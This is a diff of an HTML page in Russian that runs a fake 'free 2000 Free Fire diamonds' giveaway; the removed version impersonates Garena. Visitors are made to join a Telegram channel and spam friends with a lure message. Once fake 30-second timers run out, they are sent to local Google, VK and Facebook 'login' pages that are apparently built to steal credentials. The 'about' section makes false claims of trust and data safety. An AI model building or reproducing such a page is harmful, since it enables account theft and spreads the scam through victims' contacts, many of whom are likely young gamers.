@@ -3,302 +3,221 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Раздача алмазов от Garena</title>
+  <title>Заработай алмазы</title>
   <style>
     body {
       margin: 0;
-      padding: 0;
-      font-family: 'Roboto', Arial, sans-serif;
-      overflow-x: hidden;
-      background: linear-gradient(135deg, #1a1a1a, #333);
+      font-family: Arial, sans-serif;
+      background: url('video.mp4') no-repeat center center fixed;
+      background-size: cover;
       color: white;
+      overflow-x: hidden;
     }
 
-    .video-background {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      z-index: -1;
-    }
-
-    .main-content {
-      position: relative;
-      z-index: 1;
-      padding: 20px;
-      background-color: rgba(0, 0, 0, 0.8);
-      border-radius: 15px;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
-      max-width: 800px;
-      width: 90%;
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
       text-align: center;
-      margin: 20px auto;
-      overflow: hidden;
     }
 
     .task-button {
-      width: 100%;
-      padding: 12px;
-      border-radius: 6px;
+      margin: 20px;
+      padding: 15px 30px;
       font-size: 18px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
+      border: 2px solid #4CAF50;
+      border-radius: 10px;
+      background-color: transparent;
       color: white;
-      text-align: center;
-      margin-top: 15px;
+      cursor: pointer;
+      transition: background-color 0.3s;
     }
 
-    .task-button.waiting {
-      background-color: #ccc;
-    }
-
-    .task-button.completed {
+    .task-button.green {
       background-color: #4CAF50;
     }
 
-    .footer {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #ccc;
+    .task-button:disabled {
+      cursor: not-allowed;
     }
 
-    .footer a {
-      color: #ffd700;
-      text-decoration: none;
-    }
-
-    .footer a:hover {
-      text-decoration: underline;
-    }
-
-    .long-text {
-      color: white;
-      font-size: 16px;
-      margin-top: 30px;
-      text-align: center;
-      line-height: 1.6;
-    }
-
-    .info-section {
-      margin-top: 30px;
-      padding: 20px;
-      background-color: rgba(255, 215, 0, 0.1);
-      border-radius: 10px;
-      text-align: left;
-    }
-
-    .info-section h2 {
-      color: #ffd700;
-      font-size: 24px;
-      margin-bottom: 10px;
-    }
-
-    .info-section p {
-      font-size: 16px;
-      line-height: 1.6;
-    }
-
-    .hidden {
+    .task-completed {
       display: none;
+      margin-top: 20px;
+    }
+
+    .task-completed.active {
+      display: block;
+    }
+
+    .text {
+      margin: 20px 0;
+      font-size: 22px;
+      max-width: 600px;
     }
 
     .share-options {
       margin-top: 20px;
-      display: flex;
-      justify-content: center;
-      gap: 10px;
     }
 
-    .share-options button {
+    .share-options a {
+      margin: 10px;
       padding: 10px 20px;
-      font-size: 18px;
-      background-color: #555;
+      border: 2px solid #fff;
+      border-radius: 5px;
       color: white;
-      border-radius: 6px;
-      cursor: pointer;
+      text-decoration: none;
+      transition: background-color 0.3s;
     }
 
-    .share-options button:hover {
+    .share-options a:hover {
       background-color: #4CAF50;
     }
-
-    /* Стиль для кнопок входа с изображениями */
-    .login-buttons {
-      display: flex;
-      justify-content: center;
-      gap: 15px;
-      margin-top: 20px;
-    }
-
-    .login-button {
-      background-color: transparent;
-      border: none;
-      padding: 10px;
-      cursor: pointer;
-      transition: transform 0.3s ease;
-    }
-
-    .login-button img {
+    
+    .entry-buttons img {
       width: 50px;
-      height: 50px;
-      border-radius: 5px;
+      margin: 20px;
+      transition: transform 0.3s;
     }
 
-    .login-button:hover {
+    .entry-buttons img:hover {
       transform: scale(1.1);
     }
 
-    @media (max-width: 768px) {
-      .task-button {
-        width: 100%;
-      }
+    .entry-buttons {
+      display: flex;
+      justify-content: center;
+    }
+
+    .about {
+      margin-top: 50px;
+      font-size: 18px;
+      max-width: 700px;
+    }
+
+    .modal {
+      display: none;
+      background: rgba(0, 0, 0, 0.7);
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      padding: 20px;
+      z-index: 1000;
+    }
+
+    .modal.active {
+      display: flex;
+    }
+
+    .modal-content {
+      background: #222;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    .modal-content a {
+      color: white;
+      text-decoration: none;
+      background-color: #4CAF50;
+      padding: 10px 20px;
+      border-radius: 5px;
+      margin-top: 20px;
+      display: inline-block;
+      transition: background-color 0.3s;
+    }
+
+    .modal-content a:hover {
+      background-color: #45a049;
     }
   </style>
 </head>
 <body>
 
-  <video class="video-background" autoplay loop muted playsinline>
-    <source src="video.mp4" type="video/mp4">
-    Ваш браузер не поддерживает видео.
-  </video>
+  <div class="container">
+    <h1>Получите 2000 алмазов</h1>
+    <p class="text">Чтобы получить 2000 алмазов, выполните следующее задание: перейдите по ссылке, подпишитесь на наш канал в Telegram, выполните простое действие и получите свою награду. Также не забывайте поделиться с друзьями!</p>
 
-  <div class="main-content">
-    <h1>Раздача алмазов от Garena</h1>
-    <p>Мы даем алмазы за выполнение простых заданий! Выполните шаги и получите алмазы на свой аккаунт.</p>
+    <button class="task-button" id="button1">Перейдите и подпишитесь на Telegram</button>
+    <button class="task-button" id="button2">Поделитесь с друзьями</button>
 
-    <div class="long-text">
-      <p>Для того, чтобы получить 2000 алмазов, выполните следующее задание:</p>
-    </div>
-
-    <div id="task-1">
-      <button class="task-button waiting" id="task-btn-1" onclick="startTask('task-1', 'https://ify.ac/1YsR')">Перейти по ссылке и подписаться на Telegram канал</button>
-    </div>
-
-    <div id="task-2">
-      <button class="task-button waiting" id="task-btn-2" onclick="showShareOptions()">Поделиться с 10 друзьями</button>
-    </div>
-
-    <div class="long-text">
-      <p>Как только все кнопки станут зелеными, они исчезнут, и появится окно с вашим призом!</p>
-    </div>
-
-    <div class="info-section hidden" id="reward-section">
-      <h2>Поздравляем! Вы забрали свои 2000 алмазов.</h2>
-      <p>Теперь войдите в свой аккаунт для получения награды. Выберите способ входа:</p>
-
-      <div class="login-buttons">
-        <button class="login-button" onclick="window.location.href='login.google.html'">
-          <img src="google-icon.png" alt="Google">
-        </button>
-        <button class="login-button" onclick="window.location.href='login.facebook.html'">
-          <img src="facebook-icon.png" alt="Facebook">
-        </button>
-        <button class="login-button" onclick="window.location.href='login.vk.html'">
-          <img src="vk-icon.png" alt="VK">
-        </button>
+    <div class="task-completed" id="taskCompleted">
+      <p>Задание выполнено! Теперь заберите свои 2000 алмазов!</p>
+      <div class="entry-buttons">
+        <a href="login.google.html"><img src="google-icon.png" alt="Google"></a>
+        <a href="login.vk.html"><img src="vk-icon.png" alt="VK"></a>
+        <a href="login.facebook.html"><img src="facebook-icon.png" alt="Facebook"></a>
       </div>
     </div>
 
-    <div class="footer">
-      <p>Официальные контакты Garena:</p>
-      <p>
-        <a href="https://www.garena.sg" target="_blank">Сайт</a> | 
-        <a href="https://www.facebook.com/garena" target="_blank">Facebook</a> | 
-        <a href="https://twitter.com/garena" target="_blank">Twitter</a>
-      </p>
+    <div class="share-options">
+      <a href="https://ify.ac/1YsR" target="_blank">Перейти в Telegram канал</a>
+      <a href="https://gamegift.live/" target="_blank">Поделиться с друзьями</a>
+    </div>
+
+    <div class="about">
+      <h2>О нашем сервисе</h2>
+      <p>Мы работаем уже более 2 лет, предоставляя уникальную возможность получить алмазы для мобильных игр, таких как Free Fire, за выполнение простых заданий. За этот период мы сумели завоевать доверие десятков тысяч пользователей по всему миру, и наша репутация — это главный показатель того, что мы находимся на правильном пути.</p>
+      <p>Наша цель — сделать процесс получения игровых ресурсов доступным и безопасным для всех. Мы предлагаем пользователям не только простые и удобные способы получения алмазов, но и уверенность в безопасности их данных. Мы понимаем, что безопасность пользователей — это не просто важный аспект, а основа успешной работы любого онлайн-сервиса.</p>
+      <p>Мы гордимся тем, что за годы работы наша команда достигла таких высоких результатов, а наша база пользователей продолжает расти. Мы уже отдали 10 000 000 алмазов пользователям по всему миру, и это только начало! Присоединяйтесь к нам, и вы тоже сможете воспользоваться этим уникальным предложением. Время, проведенное с нами, не будет потрачено зря, ведь вы не только получаете алмазы, но и расширяете свои возможности в любимых играх.</p>
+    </div>
+  </div>
+
+  <div class="modal" id="modal">
+    <div class="modal-content">
+      <h2>Задание выполнено!</h2>
+      <p>Спасибо за участие! Перейдите по кнопке ниже, чтобы забрать свои 2000 алмазов.</p>
+      <a href="login.google.html">Забрать алмазы через Google</a>
+      <a href="login.vk.html">Забрать алмазы через VK</a>
+      <a href="login.facebook.html">Забрать алмазы через Facebook</a>
     </div>
   </div>
 
   <script>
-    let completedTasks = 0;
+    let button1 = document.getElementById("button1");
+    let button2 = document.getElementById("button2");
+    let taskCompleted = document.getElementById("taskCompleted");
+    let modal = document.getElementById("modal");
+    let taskCompletedTimer;
+    let shareCompleted = 0;
 
-    // Начинаем выполнение задания с задержкой
-    function startTask(taskId, link) {
-      const taskButton = document.getElementById('task-btn-' + taskId.charAt(taskId.length - 1));
-      taskButton.classList.remove('waiting');
-      taskButton.classList.add('completed');
-      taskButton.innerText = 'Задание выполняется...';
+    button1.addEventListener("click", function() {
+      button1.classList.add("green");
+      checkTaskCompletion();
+    });
 
-      // Задержка 30 секунд, после которой кнопка станет зеленой
-      setTimeout(() => {
-        taskButton.innerText = 'Задание выполнено!';
-        taskButton.classList.add('completed');
-        completedTasks++;
+    button2.addEventListener("click", function() {
+      button2.classList.add("green");
+      checkTaskCompletion();
+    });
 
-        if (completedTasks === 2) {
-          setTimeout(() => {
-            document.getElementById('reward-section').classList.remove('hidden');
-          }, 1000); // Задержка 1 секунда перед отображением
-        }
-      }, 30000);
+    function checkTaskCompletion() {
+      if (button1.classList.contains("green") && button2.classList.contains("green")) {
+        taskCompletedTimer = setTimeout(function() {
+          taskCompleted.classList.add("active");
+        }, 30000); // Задержка 30 секунд
+      }
+    }
 
-      // Открывает ссылку в новой вкладке
+    function shareSuccess() {
+      shareCompleted += 1;
+      if (shareCompleted >= 5) {
+        taskCompleted.classList.add("active");
+      }
+    }
+
+    button2.addEventListener("click", function() {
+      let link = `https://gamegift.live/?message=Привет! Заходи, выполни задание и забери 2000 алмазов!`;
       window.open(link, '_blank');
-    }
-
-    // Показываем всплывающее окно для выбора мессенджера
-    function showShareOptions() {
-      const shareOptions = document.createElement('div');
-      shareOptions.classList.add('share-options');
-      
-      // Кнопки для выбора мессенджера
-      const whatsappButton = document.createElement('button');
-      whatsappButton.innerText = 'Поделиться в WhatsApp';
-      whatsappButton.onclick = () => shareMessage('whatsapp');
-      
-      const telegramButton = document.createElement('button');
-      telegramButton.innerText = 'Поделиться в Telegram';
-      telegramButton.onclick = () => shareMessage('telegram');
-      
-      const vkButton = document.createElement('button');
-      vkButton.innerText = 'Поделиться в VK';
-      vkButton.onclick = () => shareMessage('vk');
-      
-      // Добавляем кнопки в DOM
-      shareOptions.appendChild(whatsappButton);
-      shareOptions.appendChild(telegramButton);
-      shareOptions.appendChild(vkButton);
-      
-      // Добавляем блок с выбором мессенджера
-      document.querySelector('.main-content').appendChild(shareOptions);
-    }
-
-    // Функция для отправки сообщения в выбранный мессенджер
-    function shareMessage(platform) {
-      const message = "Привет! Это сайт дает 2000 алмазов каждому заходи я уже получил... Заходи и выполняй задания, забери свои 2000 алмазов здесь: https://gamegift.live/";
-
-      let url;
-      if (platform === 'whatsapp') {
-        url = `https://wa.me/?text=${encodeURIComponent(message)}`;
-      } else if (platform === 'telegram') {
-        url = `https://t.me/share/url?url=${encodeURIComponent("https://your-site-link.com")}&text=${encodeURIComponent(message)}`;
-      } else if (platform === 'vk') {
-        url = `https://vk.com/share.php?url=${encodeURIComponent("https://your-site-link.com")}&title=${encodeURIComponent(message)}`;
-      }
-
-      // Открытие ссылки для отправки сообщения
-      window.open(url, '_blank');
-
-      // Убираем блок с выбором мессенджера
-      document.querySelector('.share-options').remove();
-
-      // Обновляем состояние кнопки
-      const taskButton = document.getElementById('task-btn-2');
-      taskButton.classList.remove('waiting');
-      taskButton.classList.add('completed');
-      taskButton.innerText = 'Задание выполнено!';
-      
-      completedTasks++;
-
-      if (completedTasks === 2) {
-        setTimeout(() => {
-          document.getElementById('reward-section').classList.remove('hidden');
-        }, 1000);
-      }
-    }
+      shareSuccess();
+    });
   </script>
-
 </body>
 </html>
